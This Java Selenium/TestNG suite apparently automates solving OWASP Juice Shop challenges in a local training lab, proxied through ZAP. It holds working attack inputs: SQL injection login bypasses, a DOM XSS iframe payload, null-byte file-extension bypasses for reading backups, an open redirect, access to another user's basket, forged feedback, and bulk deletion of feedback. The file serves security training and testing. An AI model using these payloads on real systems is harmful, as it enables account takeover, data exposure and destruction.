package tests.JuiceShop;

import utilities.JuiceShop.JuiceShopApi;

import pom.JuiceShop.LoginPage;
import pom.JuiceShop.SearchPage;

import utilities.ScreenshotHelper;

import org.openqa.selenium.Alert;
import org.openqa.selenium.By;
import org.openqa.selenium.json.Json;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.openqa.selenium.WebElement;

import org.testng.Assert;
import org.testng.annotations.Test;
import automation.ZapManager;

import java.time.Duration;
import java.util.List;
import java.util.Map;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.InetSocketAddress;
import java.net.ProxySelector;


public class JuiceShopChallengesTest extends JuiceShopBaseTest
{
    @Test(priority = 1)
    public void testSqlInjectionLoginBypass()
    {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();

        // Execute the classic Juice Shop SQL Injection challenge: admin login bypass
        loginPage.login("admin@juice-sh.op'--", "anything");

        // Verify redirect to search and successful administrative session
        new WebDriverWait(driver, Duration.ofSeconds(10))
                .until(ExpectedConditions.urlContains("/search"));

        ScreenshotHelper.capture(driver);
        Assert.assertTrue(loginPage.isUserLoggedIn(), "SQL Injection authentication bypass failed: user is not logged in.");
    }

    @Test(priority = 2)
    public void testDomXssChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        SearchPage searchPage = new SearchPage(driver);
        searchPage.dismissInitialOverlays();

        String payload = "<iframe src=\"javascript:alert(`xss`)\">";
        searchPage.search(payload);

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        Alert alert = wait.until(ExpectedConditions.alertIsPresent());

        Assert.assertEquals(alert.getText(), "xss", "DOM XSS payload did not execute correctly.");
        alert.accept();

        ScreenshotHelper.capture(driver);
        System.out.println("DOM XSS payload executed successfully.");
    }

    @Test(priority = 3)
    public void testConfidentialDocumentChallenge() throws Exception {
        HttpResponse<String> response = sendGet("/ftp/acquisitions.md");
        ScreenshotHelper.captureResponse(ZapManager.getDriver(), response);

        Assert.assertEquals(response.statusCode(), 200, "Confidential document was not accessible.");
        Assert.assertFalse(response.body().isBlank(), "Confidential document was empty.");

        assertChallengeSolved("Confidential Document");
    }

    @Test(priority = 4)
    public void testExposedMetricsChallenge() throws Exception {
        HttpResponse<String> response = sendGet("/metrics");

        System.out.println("Metrics status: " + response.statusCode());
        System.out.println("Metrics URL: " + response.request().uri());

        Assert.assertEquals(response.statusCode(), 200);
        Assert.assertTrue(response.body().contains("# HELP"));

        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "#/score-board");

        new WebDriverWait(driver, Duration.ofSeconds(15))
                .until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("app-score-board")));

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Exposed Metrics");
    }

    @Test(priority = 5)
    public void testAdminSectionChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();
        loginPage.login("admin@juice-sh.op'--", "anything");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.until(ExpectedConditions.urlContains("/search"));

        driver.get(baseUrl + "#/administration");
        wait.until(ExpectedConditions.visibilityOfElementLocated(
                By.cssSelector("app-administration")));

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Admin Section");
    }

    @Test(priority = 6)
    public void testSecurityPolicyChallenge() {
        var driver = ZapManager.getDriver();

        driver.get(java.net.URI.create(baseUrl).resolve("/.well-known/security.txt").toString());

        String content = driver.findElement(By.tagName("body")).getText();
        Assert.assertTrue(content.contains("Contact:"), "Security policy was not retrieved.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Security Policy");
    }

    @Test(priority = 7)
    public void testMissingEncodingChallenge() {
        var driver = ZapManager.getDriver();

        String path = "/assets/public/images/uploads/" +
                "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg";

        driver.get(java.net.URI.create(baseUrl).resolve(path).toString());

        Assert.assertTrue(driver.getCurrentUrl().contains("%23zatschi"),
                "Encoded image request was not made.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Missing Encoding");
    }

    @Test(priority = 8)
    public void testExtraLanguageChallenge() {
        var driver = ZapManager.getDriver();

        driver.get(java.net.URI.create(baseUrl).resolve("/assets/i18n/tlh_AA.json").toString());

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Extra Language");
    }

    @Test(priority = 9)
    public void testPrivacyPolicyChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "#/privacy-security/privacy-policy");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("app-privacy-policy .privacy-policy")));

        wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector("app-privacy-policy img[src$='81px.png']")));

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Privacy Policy");
    }

    @Test(priority = 11)
    public void testErrorHandlingChallenge() {
        var driver = ZapManager.getDriver();

        String url = java.net.URI.create(baseUrl).resolve("/rest/products/search?q=%27%3B").toString();

        driver.get(url);

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.textToBePresentInElementLocated(By.tagName("body"), "SQLITE_ERROR"));

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Error Handling");
    }

    @Test(priority = 12)
    public void testPasswordStrengthChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();

        // Authenticate using the administrator's original weak password.
        loginPage.login("admin@juice-sh.op", "admin123");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.urlContains("/search"));

        Assert.assertTrue(loginPage.isUserLoggedIn(), "Administrator login failed.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Password Strength");
    }

    @Test(priority = 13)
    public void testLoginBenderChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();

        loginPage.login("bender@juice-sh.op'--", "anything");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.urlContains("/search"));

        Assert.assertTrue(loginPage.isUserLoggedIn(), "Bender login bypass failed.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Login Bender");
    }

    @Test(priority = 14)
    public void testLoginJimChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();

        loginPage.login("jim@juice-sh.op'--", "anything");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.urlContains("/search"));

        Assert.assertTrue(loginPage.isUserLoggedIn(), "Jim login bypass failed.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Login Jim");
    }

    @Test(priority = 15)
    public void testAccessLogChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/support/logs/");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        WebElement logLink = wait.until(ExpectedConditions.presenceOfElementLocated(
                By.cssSelector("a[href*='access.log']")));

        String logUrl = logLink.getAttribute("href");
        Assert.assertNotNull(logUrl, "No access log link was found.");

        ScreenshotHelper.capture(driver);
        driver.get(logUrl);

        assertChallengeSolved("Access Log");
    }

    @Test(priority = 16)
    public void testMisplacedIaCFilesChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/infrastructure/terraform/main.tf");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.until(ExpectedConditions.textToBePresentInElementLocated(
                By.tagName("body"), "provider"));

        String content = driver.findElement(By.tagName("body")).getText();
        Assert.assertTrue(content.contains("resource"), "Terraform configuration was not exposed.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Misplaced IaC Files");
    }

    @Test(priority = 17)
    public void testBonusPayloadChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        SearchPage searchPage = new SearchPage(driver);
        searchPage.dismissInitialOverlays();

        String payload = "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" "
                + "src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076"
                + "&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true"
                + "&show_reposts=false&show_teaser=true\"></iframe>";

        searchPage.search(payload);

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("iframe[src*='soundcloud.com/player']")));

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Bonus Payload");
    }

    @Test(priority = 18)
    public void testEasterEggChallenge() throws Exception {
        var driver = ZapManager.getDriver();

        // Discover the Easter Egg through the publicly exposed FTP directory.
        driver.get(baseUrl + "/ftp/");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector("a[href*='eastere.gg']")));

        // Use the extension-validation weakness in this local Juice Shop lab.
        String path = "/ftp/eastere.gg%2500.md";
        HttpResponse<String> response = sendGet(path);

        System.out.println("[EASTER EGG] HTTP status: " + response.statusCode());

        Assert.assertEquals(response.statusCode(), 200,
                "Easter Egg file was not accessible. Response: " + response.body());

        Assert.assertTrue(response.body().toLowerCase().contains("easter egg"),
                "The server returned HTTP 200, but the expected Easter Egg content was missing.");

        ScreenshotHelper.captureResponse(driver, response);
        assertChallengeSolved("Easter Egg");
    }

    @Test(priority = 19)
    public void testPoisonNullByteChallenge() throws Exception {
        String fileName = "package.json.bak%2500.md";
        String path = "/ftp/";

        var driver = ZapManager.getDriver();
        driver.get(baseUrl + path);

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector("a[href*='package.json.bak']")));

        HttpResponse<String> response = sendGet(path + fileName);

        System.out.println("[POISON NULL BYTE] HTTP status: " + response.statusCode());
        System.out.println("[POISON NULL BYTE] Content type: " + response.headers().firstValue("content-type").orElse("unknown"));
        System.out.println("[POISON NULL BYTE] Response length: " + response.body().length());

        Assert.assertEquals(response.statusCode(), 200, "Developer backup request did not return HTTP 200.");

        // Save the response and preserve the result screen for SlowMo presentations.
        ScreenshotHelper.captureResponse(driver, response);

        // Verify actual challenge completion rather than assuming a particular body format.
        assertChallengeSolved("Forgotten Developer Backup");
        assertChallengeSolved("Poison Null Byte");
    }
    @Test(priority = 20)
    public void testForgottenSalesBackupChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        String path = "/ftp/coupons_2013.md.bak%2500.pdf";

        HttpResponse<String> response = sendGet(path);
        System.out.println("[SALES BACKUP] HTTP status: " + response.statusCode());

        Assert.assertEquals(response.statusCode(), 200, "Sales backup was not accessible.");

        ScreenshotHelper.captureResponse(driver, response);
        assertChallengeSolved("Forgotten Sales Backup");
    }

    @Test(priority = 21)
    public void testMisplacedSignatureFileChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        String path = "/ftp/suspicious_errors.yml%2500.md";

        HttpResponse<String> response = sendGet(path);
        System.out.println("[SIEM SIGNATURE] HTTP status: " + response.statusCode());

        Assert.assertEquals(response.statusCode(), 200, "SIEM signature file was not accessible.");

        ScreenshotHelper.captureResponse(driver, response);
        assertChallengeSolved("Misplaced Signature File");
    }

    @Test(priority = 22)
    public void testOutdatedAllowlistChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        String destination = "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm";
        String path = "/redirect?to=" + destination;

        HttpResponse<String> response = sendGet(path);
        String location = response.headers().firstValue("location").orElse("");

        System.out.println("[OUTDATED ALLOWLIST] HTTP status: " + response.statusCode());
        System.out.println("[OUTDATED ALLOWLIST] Redirect target: " + location);

        Assert.assertEquals(response.statusCode(), 302, "Expected a redirect response.");
        Assert.assertEquals(location, destination, "Unexpected redirect destination.");

        ScreenshotHelper.captureResponse(driver, response);
        assertChallengeSolved("Outdated Allowlist");
    }


    @Test(priority = 23)
    public void testPrivacyPolicyInspectionChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        String challengePath = "/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility";
        String imagePath = "/assets/private/thank-you.jpg";

        driver.get(baseUrl + challengePath);
        assertChallengeSolved("Privacy Policy Inspection");

        boolean imageAvailable = false;

        try {
            HttpResponse<String> response = sendGet(imagePath);
            String contentType = response.headers().firstValue("Content-Type").orElse("");

            if (response.statusCode() == 200 && contentType.toLowerCase().startsWith("image/")) {
                driver.get(baseUrl + imagePath);

                imageAvailable = new WebDriverWait(driver, Duration.ofSeconds(5)).until(d ->
                        d.findElements(By.tagName("img")).stream().anyMatch(img -> {
                            String width = img.getDomProperty("naturalWidth");
                            return width != null && Integer.parseInt(width) > 0;
                        })
                );
            }
        } catch (Exception e) {
            System.out.println("[PRIVACY POLICY] Image unavailable: " + e.getMessage());
        }

        if (!imageAvailable) {
            System.out.println("[PRIVACY POLICY] Opening the application's Privacy Policy page.");
            driver.get(baseUrl + "#/privacy-security/privacy-policy");

            new WebDriverWait(driver, Duration.ofSeconds(15)).until(
                    ExpectedConditions.visibilityOfElementLocated(By.cssSelector("app-privacy-policy"))
            );
        }

        ScreenshotHelper.capture(driver);
    }

    @Test(priority = 24)
    public void testRepetitiveRegistrationChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        JuiceShopApi api = new JuiceShopApi(baseUrl);
        String email = "registration-" + System.nanoTime() + "@example.com";

        Map<String, Object> payload = Map.of(
                "email", email,
                "password", "Password123!",
                "passwordRepeat", "Different123!"
        );

        HttpResponse<String> response = api.post("/api/Users/", payload);
        System.out.println("[REPETITIVE REGISTRATION] HTTP status: " + response.statusCode());

        ScreenshotHelper.captureResponse(driver, response);
        assertChallengeSolved("Repetitive Registration");
    }

    @Test(priority = 25)
    public void testEmptyUserRegistrationChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        JuiceShopApi api = new JuiceShopApi(baseUrl);

        Map<String, Object> payload = Map.of(
                "email", "",
                "password", "",
                "passwordRepeat", ""
        );

        HttpResponse<String> response = api.post("/api/Users/", payload);
        System.out.println("[EMPTY REGISTRATION] HTTP status: " + response.statusCode());

        ScreenshotHelper.captureResponse(driver, response);
        assertChallengeSolved("Empty User Registration");
    }

    @Test(priority = 26)
    public void testViewBasketChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        JuiceShopApi api = new JuiceShopApi(baseUrl);
        var session = api.login();

        int targetBasket = session.basketId() == 1 ? 2 : 1;
        HttpResponse<String> response = api.get("/rest/basket/" + targetBasket, session.token());

        System.out.println("[VIEW BASKET] Authenticated basket: " + session.basketId());
        System.out.println("[VIEW BASKET] Requested basket: " + targetBasket);
        System.out.println("[VIEW BASKET] HTTP status: " + response.statusCode());

        Assert.assertNotEquals(targetBasket, session.basketId(), "Target basket belongs to the authenticated user.");
        Assert.assertEquals(response.statusCode(), 200, "Another user's basket was not accessible.");

        ScreenshotHelper.captureResponse(driver, response);
        assertChallengeSolved("View Basket");
    }

    @Test(priority = 27)
    @SuppressWarnings("unchecked")
    public void testForgedFeedbackChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        JuiceShopApi api = new JuiceShopApi(baseUrl);
        var session = api.login();

        HttpResponse<String> captchaResponse = api.get("/rest/captcha/");
        Assert.assertEquals(captchaResponse.statusCode(), 200, "CAPTCHA request failed.");

        Map<String, Object> captcha = new Json().toType(captchaResponse.body(), Map.class);
        int captchaId = ((Number) captcha.get("captchaId")).intValue();
        String answer = captcha.get("answer").toString();
        int forgedUserId = session.userId() == 1 ? 2 : 1;

        Map<String, Object> payload = Map.of(
                "UserId", forgedUserId,
                "comment", "Automated authorization test",
                "rating", 1,
                "captchaId", captchaId,
                "captcha", answer
        );

        HttpResponse<String> response = api.post("/api/Feedbacks/", payload, session.token());

        System.out.println("[FORGED FEEDBACK] Authenticated user: " + session.userId());
        System.out.println("[FORGED FEEDBACK] Submitted as user: " + forgedUserId);
        System.out.println("[FORGED FEEDBACK] HTTP status: " + response.statusCode());

        Assert.assertNotEquals(forgedUserId, session.userId(), "Feedback must reference another user.");
        Assert.assertEquals(response.statusCode(), 201, "Forged feedback was not accepted.");

        ScreenshotHelper.captureResponse(driver, response);
        assertChallengeSolved("Forged Feedback");
    }

    @Test(priority = 28)
    public void testFiveStarFeedbackChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        JuiceShopApi api = new JuiceShopApi(baseUrl);
        var session = api.login();

        HttpResponse<String> initial = api.get("/api/Feedbacks/", session.token());
        Assert.assertEquals(initial.statusCode(), 200, "Could not retrieve customer feedback.");

        List<Map<String, Object>> feedbacks = api.getFeedbackRecords(initial.body());
        int removed = 0;

        for (Map<String, Object> feedback : feedbacks) {
            int rating = ((Number) feedback.get("rating")).intValue();
            if (rating != 5) continue;

            int id = ((Number) feedback.get("id")).intValue();
            HttpResponse<String> deletion = api.delete("/api/Feedbacks/" + id, session.token());

            Assert.assertTrue(deletion.statusCode() == 200 || deletion.statusCode() == 204,
                    "Failed to delete feedback ID " + id + ". HTTP " + deletion.statusCode());

            removed++;
            System.out.println("[FIVE-STAR FEEDBACK] Deleted feedback ID: " + id);
        }

        HttpResponse<String> remaining = api.get("/api/Feedbacks/", session.token());
        Assert.assertEquals(remaining.statusCode(), 200, "Could not verify remaining feedback.");

        boolean fiveStarsRemain = api.getFeedbackRecords(remaining.body()).stream()
                .anyMatch(feedback -> ((Number) feedback.get("rating")).intValue() == 5);

        Assert.assertFalse(fiveStarsRemain, "Five-star customer feedback still exists.");
        System.out.println("[FIVE-STAR FEEDBACK] Entries removed: " + removed);

        ScreenshotHelper.captureResponse(driver, remaining);
        assertChallengeSolved("Five-Star Feedback");
    }


    /**********************************************************************************************************************/
    // This test not only completes the challenge but serves the purpose of verifying the # of challenges that have been
    // completed by the test suite. For this reason, it's priority is marked as 1000 so it's the last test ran.

    @Test(priority = 1000)
    public void testScoreBoardChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();

        driver.get(baseUrl + "#/score-board");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));

        wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("app-score-board")));
        wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("challenge-card")));

        Assert.assertTrue(driver.getCurrentUrl().contains("#/score-board"), "Score Board page did not load.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Score Board");
    }
    /**********************************************************************************************************************/
    // Helper functions
    private HttpResponse<String> sendGet(String path) throws Exception {
        URI proxyUri = URI.create("http://" + ZapManager.getProxyAddress());

        HttpClient client = HttpClient.newBuilder()
                .proxy(ProxySelector.of(new InetSocketAddress(proxyUri.getHost(), proxyUri.getPort())))
                .connectTimeout(Duration.ofSeconds(10))
                .build();

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(baseUrl + path))
                .timeout(Duration.ofSeconds(15))
                .header("User-Agent", "JuiceShopSecurityAutomation/1.0")
                .GET()
                .build();

        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

        System.out.println("[HTTP] GET " + path + " -> " + response.statusCode());
        return response;
    }

    @SuppressWarnings("unchecked")
    private void assertChallengeSolved(String challengeName) {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/api/Challenges");

        String response = driver.findElement(By.tagName("body")).getText();
        Map<String, Object> json = new Json().toType(response, Map.class);
        List<Map<String, Object>> challenges = (List<Map<String, Object>>) json.get("data");

        Assert.assertNotNull(challenges, "Challenge API returned no challenge list.");

        for (Map<String, Object> challenge : challenges) {
            if (challengeName.equals(challenge.get("name"))) {
                Assert.assertEquals(challenge.get("solved"), Boolean.TRUE,
                        "Challenge not completed: " + challengeName);

                System.out.println("[SOLVED] " + challengeName);
                return;
            }
        }

        Assert.fail("Challenge not found: " + challengeName);
    }


}